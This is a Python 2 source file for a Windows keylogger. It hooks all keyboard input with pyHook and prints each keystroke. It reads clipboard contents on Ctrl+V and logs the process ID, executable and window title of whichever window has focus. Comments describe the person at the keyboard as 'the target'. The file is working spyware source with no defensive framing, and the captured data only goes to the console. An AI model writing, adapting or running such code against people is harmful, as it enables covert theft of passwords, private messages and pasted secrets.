from ctypes import *
import pythoncom
#specific lib for trapping all keyboard events
import pyHook
import win32clipboard

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None

# helper function for the keylogger
# gets active window's PID, executable name and window title bar name
# outputs all that info 
def get_current_process():

    # get a handle to the active window on the target PC
    # which is receiving input
    # using foreground window to avoid dependencies on application
    hwnd = user32.GetForegroundWindow()

    # find the process ID of the active window
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))

    # store the current process ID of the active window
    process_id = "%d" % pid.value

    # open the process, getting the executable
    # using it's ID
    executable = create_string_buffer("\x00" * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

    # get the executable name 
    psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)

    # get the text of the active window's title bar
    window_title = create_string_buffer("\x00" * 512)
    length = user32.GetWindowTextA(hwnd, byref(window_title),512)
    
    # print a summary
    # from which process did we gather keystrokes
    print
    print "[ Process ID: %s]" % process_id
    print "[ Executable: %s]" % executable.value
    print "[ Window title: %s]" % window_title.value
    print

    # close all handles
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)

# actual keystroke capture function
def KeyStroke(event):

    global current_window
    
    # check if the target switched to another active window
    if event.WindowName != current_window:
        current_window = event.WindowName
        # call the helper function to gather
        # info about the new active window
        get_current_process()

    # if the target presses a standard key = ASCII printable range
    if event.Ascii > 32 and event.Ascii < 127:
        print chr(event.Ascii),
    else:
        # if [CTRL + V], get the pasted value on the clipboard
        if event.Key == "V":

            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            print "[PASTED DATA!] : %s" % (pasted_value),

        else:

            # print any other pressed non standard key
            print "[%s]" % event.Key

    # pass execution to the next registered hook
    return True


# create and register a hook manager
kl = pyHook.HookManager()
# every keydown event calls the Keystroke function
kl.KeyDown = KeyStroke

# register all keypresses and continue execution
kl.HookKeyboard()
pythoncom.PumpMessages()















